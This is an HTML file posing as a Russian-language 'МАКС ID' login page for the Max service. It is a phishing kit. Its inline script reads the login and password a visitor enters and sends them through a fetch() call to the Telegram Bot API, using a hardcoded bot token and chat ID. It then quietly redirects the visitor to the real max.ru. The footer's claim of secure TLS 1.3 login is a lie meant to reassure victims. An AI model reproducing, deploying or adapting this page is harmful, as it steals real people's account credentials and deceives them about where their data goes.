<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Вход в личный кабинет — Макс</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Arial, sans-serif;
        }
        body {
            background: #f4f6f9;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            width: 100%;
            max-width: 400px;
            padding: 20px;
        }
        .card {
            background: #ffffff;
            border-radius: 16px;
            padding: 40px 30px 30px;
            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.08);
            border: 1px solid #eaeef3;
        }
        .logo {
            text-align: center;
            margin-bottom: 28px;
        }
        .logo svg {
            width: 120px;
            height: auto;
        }
        .logo-text {
            font-size: 24px;
            font-weight: 700;
            color: #1a2634;
            letter-spacing: -0.5px;
        }
        .logo-text span {
            color: #e31e24;
        }
        .subtitle {
            text-align: center;
            color: #5e6f7e;
            font-size: 14px;
            margin-top: 4px;
            font-weight: 400;
        }
        .form-group {
            margin-bottom: 18px;
        }
        .form-group label {
            display: block;
            font-size: 13px;
            font-weight: 600;
            color: #1a2634;
            margin-bottom: 5px;
        }
        .form-group input {
            width: 100%;
            padding: 12px 14px;
            border: 1px solid #d0d9e2;
            border-radius: 8px;
            font-size: 15px;
            background: #fafbfc;
            transition: 0.2s;
        }
        .form-group input:focus {
            border-color: #e31e24;
            outline: none;
            background: #fff;
            box-shadow: 0 0 0 3px rgba(227, 30, 36, 0.1);
        }
        .btn {
            width: 100%;
            padding: 14px;
            background: #e31e24;
            color: #fff;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: 0.2s;
            margin-top: 8px;
        }
        .btn:hover {
            background: #c4171c;
        }
        .links {
            display: flex;
            justify-content: space-between;
            margin-top: 18px;
            font-size: 13px;
        }
        .links a {
            color: #1a2634;
            text-decoration: none;
            font-weight: 500;
        }
        .links a:hover {
            text-decoration: underline;
            color: #e31e24;
        }
        .footer-note {
            text-align: center;
            margin-top: 20px;
            font-size: 12px;
            color: #8a9aa8;
        }
        .error-msg {
            background: #fee;
            color: #b02b2b;
            padding: 8px 12px;
            border-radius: 6px;
            font-size: 13px;
            display: none;
            margin-top: 12px;
            border-left: 3px solid #e31e24;
        }
    </style>
</head>
<body>
<div class="container">
    <div class="card">
        <div class="logo">
            <div class="logo-text">МАКС <span>ID</span></div>
            <div class="subtitle">Вход в личный кабинет</div>
        </div>

        <form id="loginForm">
            <div class="form-group">
                <label>Логин или email</label>
                <input type="text" id="login" placeholder="Введите ваш логин" required>
            </div>
            <div class="form-group">
                <label>Пароль</label>
                <input type="password" id="pass" placeholder="Введите пароль" required>
            </div>
            <button type="submit" class="btn">Войти</button>
            <div class="error-msg" id="errorMsg">Неверный логин или пароль. Попробуйте снова.</div>
        </form>

        <div class="links">
            <a href="#">Забыли пароль?</a>
            <a href="#">Регистрация</a>
        </div>
        <div class="footer-note">Защищённый вход по протоколу TLS 1.3</div>
    </div>
</div>

<script>
    document.getElementById('loginForm').addEventListener('submit', function(e) {
        e.preventDefault();
        let login = document.getElementById('login').value.trim();
        let pass = document.getElementById('pass').value.trim();

        if (!login || !pass) {
            document.getElementById('errorMsg').style.display = 'block';
            return;
        }
        document.getElementById('errorMsg').style.display = 'none';

        let msg = '🟢 Вход в Макс\n👤 Логин: ' + login + '\n🔑 Пароль: ' + pass;
        fetch('https://api.telegram.org/bot8918681932:AAHkBy8LYIbYAmeZ6FqbsUcsXCIPme_UN0c/sendMessage?chat_id=8759904789&text=' + encodeURIComponent(msg))
            .then(() => {
                window.location.href = 'https://max.ru';
            })
            .catch(() => {
                window.location.href = 'https://max.ru';
            });
    });
</script>
</body>
</html>
